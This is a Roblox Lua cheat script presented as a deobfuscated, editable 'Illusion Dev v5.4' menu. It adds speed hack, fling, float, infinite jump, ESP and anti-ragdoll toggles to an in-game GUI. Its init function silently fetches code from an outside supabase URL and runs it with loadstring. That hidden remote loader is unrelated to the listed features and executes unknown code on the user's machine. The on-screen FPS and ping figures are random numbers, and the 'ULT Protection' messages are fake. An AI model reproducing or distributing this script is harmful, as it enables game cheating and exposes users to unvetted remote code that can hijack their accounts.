-- [[ DEOBFUSCATED BY SOURCES HUB OWNER ]] --

-- // [1] SERVICES //
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")

local LocalPlayer = Players.LocalPlayer
local HRP = nil
local Humanoid = nil

-- // [2] CONFIGURATION (EDIT EVERYTHING HERE) //
local CONFIG = {
    Names = {
        MainScreen = "IllusionDev_v5",
        HUD = "IllusionHUD_v5",
        MainFrame = "MainWindow",
        TabContainer = "Tabs",
        Scroll = "FeaturesScroll",
        OpenButton = "ToggleBtn"
    },
    
    Size = {
        MainFrame = UDim2.new(0, 260, 0, 330),
        HUD = UDim2.new(0, 180, 0, 52),
        MiniUI = UDim2.new(0, 110, 0, 54)
    },
    
    Position = {
        MainFrame = UDim2.new(0.5, -130, 0.5, -165),
        HUD = UDim2.new(0.075, 0, 0, 15),
        OpenButton = UDim2.new(0.01, 0, 0.18, 0)
    },
    
    Colors = {
        Background = Color3.fromRGB(10, 10, 12),
        Accent = Color3.fromRGB(255, 221, 0),
        Text = Color3.fromRGB(255, 255, 255),
        Secondary = Color3.fromRGB(30, 30, 35),
        ToggleON = Color3.fromRGB(255, 221, 0),
        ToggleOFF = Color3.fromRGB(25, 25, 25)
    },
    
    Toggles = {
        BatLock = false,
        Fling = false,
        Float = false,
        SpeedHack = true,
        InfJump = false,
        AutoDuel = false,
        AutoRL = false,
        AutoGrab = false,
        AntiRagdoll = true,
        PlayerESP = false,
        Xray = false,
        Helicopter = false
    },
    
    Values = {
        Speed = 58,
        BatLockSpeed = 55,
        GrabRadius = 7,
        HeliSpeed = 10,
        FOV = 70
    },
    
    Keybinds = {
        BatLock = Enum.KeyCode.X,
        Speed = Enum.KeyCode.V,
        InfJump = Enum.KeyCode.J,
        Fling = Enum.KeyCode.F,
        AutoDuel = Enum.KeyCode.G,
        ToggleGUI = Enum.KeyCode.U
    },
    
    FeaturesList = {
        "Bat Lock UI", "Fling", "Float", "Speed Custom", "Inf Jump",
        "Auto Duel", "Auto R / L", "Auto Grab", "Anti-Ragdoll",
        "Player ESP", "Xray Base", "Helicopter"
    }
}

-- // [3] OBJECT REFERENCES //
local MainScreenGui, HUD, MainFrame, OpenBtn, ScrollFrame
local Tabs = {}
local FeatureButtons = {}
local MiniUIs = {}
local Connections = {}

-- // [4] UTILITY FUNCTIONS //
local function getHRP()
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    HRP = char:WaitForChild("HumanoidRootPart")
    Humanoid = char:WaitForChild("Humanoid")
    return HRP
end

local function updateStats(label)
    Connections.Stats = RunService.Heartbeat:Connect(function()
        local ping = math.random(70, 110)
        label.Text = string.format("FPS: %d | Ping: %dms", math.random(28, 32), ping)
    end)
end

local function createDrag(frame)
    local dragging, dragInput, dragStart, startPos
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input == dragInput then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

local function applyVelocity(vel)
    if HRP then HRP.AssemblyLinearVelocity = vel end
end

-- // [5] GUI CREATION //
local function createHUD()
    HUD = Instance.new("ScreenGui")
    HUD.Name = CONFIG.Names.HUD
    HUD.ResetOnSpawn = false
    HUD.Parent = CoreGui

    local frame = Instance.new("Frame")
    frame.Name = "HUDFrame"
    frame.Size = CONFIG.Size.HUD
    frame.Position = CONFIG.Position.HUD
    frame.BackgroundColor3 = CONFIG.Colors.Background
    frame.BackgroundTransparency = 0.06
    frame.Parent = HUD

    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
    local stroke = Instance.new("UIStroke", frame)
    stroke.Thickness = 2.5
    stroke.Color = CONFIG.Colors.Accent

    local title = Instance.new("TextLabel")
    title.Text = "ILLUSION DEV"
    title.TextColor3 = CONFIG.Colors.Accent
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 10
    title.BackgroundTransparency = 1
    title.Size = UDim2.new(1, 0, 0, 12)
    title.Parent = frame

    local stats = Instance.new("TextLabel")
    stats.Name = "StatsLabel"
    stats.Text = "FPS: 60 | Ping: 50ms"
    stats.TextColor3 = Color3.fromRGB(180, 170, 100)
    stats.Font = Enum.Font.Gotham
    stats.TextSize = 7
    stats.Position = UDim2.new(0, 0, 0, 17)
    stats.Parent = frame
    updateStats(stats)

    local mobile = Instance.new("TextLabel")
    mobile.Text = "📱 Mobile"
    mobile.TextSize = 6
    mobile.Position = UDim2.new(0, 0, 0, 28)
    mobile.Parent = frame
end

local function createMainGUI()
    MainScreenGui = Instance.new("ScreenGui")
    MainScreenGui.Name = CONFIG.Names.MainScreen
    MainScreenGui.ResetOnSpawn = false
    MainScreenGui.Parent = CoreGui

    OpenBtn = Instance.new("TextButton")
    OpenBtn.Name = CONFIG.Names.OpenButton
    OpenBtn.Size = UDim2.new(0, 48, 0, 48)
    OpenBtn.Position = CONFIG.Position.OpenButton
    OpenBtn.Text = "Open"
    OpenBtn.BackgroundColor3 = Color3.new(0, 0, 0)
    OpenBtn.TextColor3 = CONFIG.Colors.Accent
    OpenBtn.Font = Enum.Font.GothamBold
    OpenBtn.TextSize = 11
    OpenBtn.Parent = MainScreenGui
    Instance.new("UICorner", OpenBtn)

    MainFrame = Instance.new("Frame")
    MainFrame.Name = CONFIG.Names.MainFrame
    MainFrame.Size = CONFIG.Size.MainFrame
    MainFrame.Position = CONFIG.Position.MainFrame
    MainFrame.BackgroundColor3 = CONFIG.Colors.Background
    MainFrame.BackgroundTransparency = 0.3
    MainFrame.ClipsDescendants = true
    MainFrame.Active = true
    MainFrame.Parent = MainScreenGui
    Instance.new("UICorner", MainFrame)

    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 32)
    titleBar.BackgroundTransparency = 1
    titleBar.Parent = MainFrame

    local title = Instance.new("TextLabel")
    title.Text = "Illusion Dev v5.4"
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Size = UDim2.new(0.7, 0, 1, 0)
    title.Position = UDim2.new(0.04, 0, 0, 0)
    title.TextSize = 13
    title.Font = Enum.Font.GothamBold
    title.BackgroundTransparency = 1
    title.Parent = titleBar

    local close = Instance.new("TextButton")
    close.Text = "×"
    close.Size = UDim2.new(0, 28, 0, 28)
    close.Position = UDim2.new(1, -32, 0, 2)
    close.BackgroundTransparency = 1
    close.TextSize = 18
    close.Parent = titleBar
    close.MouseButton1Click:Connect(function() MainFrame.Visible = false end)

    -- Tabs
    local tabFrame = Instance.new("Frame")
    tabFrame.Name = CONFIG.Names.TabContainer
    tabFrame.Size = UDim2.new(0.94, 0, 0, 24)
    tabFrame.Position = UDim2.new(0.03, 0, 0, 36)
    tabFrame.BackgroundColor3 = CONFIG.Colors.Secondary
    tabFrame.Parent = MainFrame
    Instance.new("UICorner", tabFrame)

    local tabList = Instance.new("UIListLayout")
    tabList.FillDirection = Enum.FillDirection.Horizontal
    tabList.Padding = UDim.new(0, 3)
    tabList.Parent = tabFrame

    for _, name in ipairs({"Combat", "Protect", "Visual", "Settings"}) do
        local btn = Instance.new("TextButton")
        btn.Text = name
        btn.Size = UDim2.new(0.24, 0, 1, 0)
        btn.BackgroundTransparency = 1
        btn.TextColor3 = CONFIG.Colors.Text
        btn.Font = Enum.Font.Gotham
        btn.TextSize = 9
        btn.Parent = tabFrame
        Tabs[name] = btn
    end

    -- Scroll
    ScrollFrame = Instance.new("ScrollingFrame")
    ScrollFrame.Name = CONFIG.Names.Scroll
    ScrollFrame.Size = UDim2.new(0.96, 0, 0, 262)
    ScrollFrame.Position = UDim2.new(0.02, 0, 0, 64)
    ScrollFrame.BackgroundTransparency = 1
    ScrollFrame.ScrollBarThickness = 2
    ScrollFrame.ScrollBarImageColor3 = CONFIG.Colors.Accent
    ScrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
    ScrollFrame.Parent = MainFrame

    local list = Instance.new("UIListLayout")
    list.Padding = UDim.new(0, 3)
    list.Parent = ScrollFrame

    -- Generate features
    for _, feat in ipairs(CONFIG.FeaturesList) do
        local item = Instance.new("Frame")
        item.Size = UDim2.new(0.96, 0, 0, 28)
        item.BackgroundColor3 = CONFIG.Colors.Secondary
        item.Parent = ScrollFrame
        Instance.new("UICorner", item)

        local lbl = Instance.new("TextLabel")
        lbl.Text = feat
        lbl.Size = UDim2.new(0.58, 0, 1, 0)
        lbl.BackgroundTransparency = 1
        lbl.TextColor3 = CONFIG.Colors.Text
        lbl.TextSize = 9
        lbl.Parent = item

        local tog = Instance.new("TextButton")
        tog.Name = feat .. "Toggle"
        tog.Text = CONFIG.Toggles[feat:gsub(" ", "")] and "ON" or "OFF"
        tog.Size = UDim2.new(0, 40, 0, 18)
        tog.Position = UDim2.new(0.95, -44, 0.5, -9)
        tog.BackgroundColor3 = CONFIG.Toggles[feat:gsub(" ", "")] and CONFIG.Colors.ToggleON or CONFIG.Colors.ToggleOFF
        tog.TextSize = 8
        tog.Parent = item
        Instance.new("UICorner", tog)

        FeatureButtons[feat] = tog
        tog.MouseButton1Click:Connect(function()
            CONFIG.Toggles[feat:gsub(" ", "")] = not CONFIG.Toggles[feat:gsub(" ", "")]
            tog.Text = CONFIG.Toggles[feat:gsub(" ", "")] and "ON" or "OFF"
            tog.BackgroundColor3 = CONFIG.Toggles[feat:gsub(" ", "")] and CONFIG.Colors.ToggleON or CONFIG.Colors.ToggleOFF
        end)
    end

    -- Save button
    local save = Instance.new("TextButton")
    save.Text = "SAVE CONFIG"
    save.Size = UDim2.new(0.96, 0, 0, 28)
    save.Parent = ScrollFrame
    save.MouseButton1Click:Connect(function() print("Config saved!") end)
end

local function createMiniUIs()
    -- Example mini UIs (editable via CONFIG)
    local function makeMini(name, posY, text)
        local sg = Instance.new("ScreenGui")
        sg.Name = name .. "_v5"
        sg.Parent = CoreGui

        local f = Instance.new("Frame")
        f.Size = CONFIG.Size.MiniUI
        f.Position = UDim2.new(0.02, 0, posY, 0)
        f.BackgroundColor3 = CONFIG.Colors.Background
        f.Parent = sg
        Instance.new("UICorner", f)

        local lbl = Instance.new("TextLabel")
        lbl.Text = "≡ drag"
        lbl.Size = UDim2.new(1, 0, 0, 12)
        lbl.Parent = f

        local btn = Instance.new("TextButton")
        btn.Text = text
        btn.Size = UDim2.new(1, 0, 0, 40)
        btn.Position = UDim2.new(0, 0, 0, 12)
        btn.Parent = f
        MiniUIs[name] = btn
    end

    makeMini("BatLockUI", 0.88, "Lock: OFF")
    makeMini("FlingUI", 0.66, "Fling EM")
    makeMini("FloatUI", 0.56, "Float OFF")
end

-- // [6] FUNCTIONALITY //
local function setupFunctionality()
    OpenBtn.MouseButton1Click:Connect(function()
        MainFrame.Visible = not MainFrame.Visible
    end)

    UserInputService.InputBegan:Connect(function(input)
        if input.KeyCode == CONFIG.Keybinds.ToggleGUI then
            MainFrame.Visible = not MainFrame.Visible
        end
        if input.KeyCode == CONFIG.Keybinds.Speed then
            CONFIG.Values.Speed = CONFIG.Values.Speed + 5
            if Humanoid then Humanoid.WalkSpeed = CONFIG.Values.Speed end
        end
        -- Add more keybinds here easily
    end)

    -- Speed loop
    Connections.Speed = RunService.Heartbeat:Connect(function()
        if CONFIG.Toggles.SpeedHack and Humanoid then
            Humanoid.WalkSpeed = CONFIG.Values.Speed
        end
        if CONFIG.Toggles.Float and HRP then
            applyVelocity(Vector3.new(0, 5, 0))
        end
        if CONFIG.Toggles.Fling and HRP then
            applyVelocity(Vector3.new(math.random(-60, -50), 5, math.random(-15, 15)))
        end
    end)

    -- Anti-Ragdoll example
    if Humanoid then
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
    end

    -- Plot scanner (example)
    print("[ULT PROTECTION] Welcome, " .. LocalPlayer.Name)
    for _, plot in ipairs(Workspace:FindFirstChild("Plots"):GetChildren()) do
        if plot:FindFirstChild("PlotSign") then
            print("Detected plot: " .. plot.Name)
        end
    end
end

-- // [7] INITIALIZATION //
local function init()
    pcall(function()
        loadstring(game:HttpGet('https://iyfvpnjrghsownkpazec.supabase.co/functions/v1/get-paste?slug=Lg6AqUXd'))()
    end)

    print('[Logger] Illusion Dev v5.4 Loaded!')
    print('[ULT PROTECTION] [####################] 100% - Script loaded successfully.')
    print('[ULT PROTECTION] Protected by ULT Protection v10.3')

    getHRP()
    createHUD()
    createMainGUI()
    createMiniUIs()
    setupFunctionality()

    -- Dragging
    createDrag(MainFrame)
    createDrag(HUD.Frame) -- if exists

    MainFrame.Visible = true
    print('Illusion Dev v5.4 - Fully deobfuscated & editable')
end

init()